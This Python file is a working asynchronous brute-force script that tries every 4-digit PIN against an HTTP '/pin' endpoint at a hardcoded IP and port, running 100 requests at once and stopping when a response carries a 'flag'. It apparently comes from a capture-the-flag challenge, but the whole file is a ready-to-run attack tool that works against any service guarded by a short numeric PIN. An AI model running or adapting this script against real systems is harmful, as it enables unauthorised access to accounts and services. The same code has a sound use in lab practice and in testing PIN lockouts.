import asyncio
import aiohttp

# Server information
ip = "94.237.54.42"  # Replace with your server IP address
port = 32157         # Replace with your server port number
url = f"http://{ip}:{port}/pin"

async def try_pin(session, pin):
    """
    Attempt a single PIN by sending a GET request.
    """
    formatted_pin = f"{pin:04d}"  # Format the PIN as a 4-digit string
    async with session.get(f"{url}?pin={formatted_pin}") as response:
        if response.status == 200:  # Check for a successful response
            json_data = await response.json()
            if 'flag' in json_data:  # Check if the response contains the flag
                print(f"✅ Correct PIN found: {formatted_pin}")
                print(f"🏴 Flag: {json_data['flag']}")
                return True
    return False

async def main():
    """
    Main function to orchestrate the PIN brute force attack.
    """
    print("🔄 Starting PIN brute-force attack...")

    async with aiohttp.ClientSession() as session:
        # Limit the number of concurrent requests to avoid overwhelming the server
        semaphore = asyncio.Semaphore(100)
        tasks = []

        async def task_wrapper(pin):
            async with semaphore:
                success = await try_pin(session, pin)
                if success:
                    for task in tasks:
                        task.cancel()  # Cancel remaining tasks
                    return True

        # Create asynchronous tasks for each PIN
        for pin in range(10000):  # 4-digit PIN range: 0000 to 9999
            tasks.append(asyncio.create_task(task_wrapper(pin)))

        # Wait for all tasks to complete or be canceled
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass

if __name__ == "__main__":
    print("🚀 Starting PIN brute-force attack...")
    asyncio.run(main())
    print("🎯 Attack completed.")
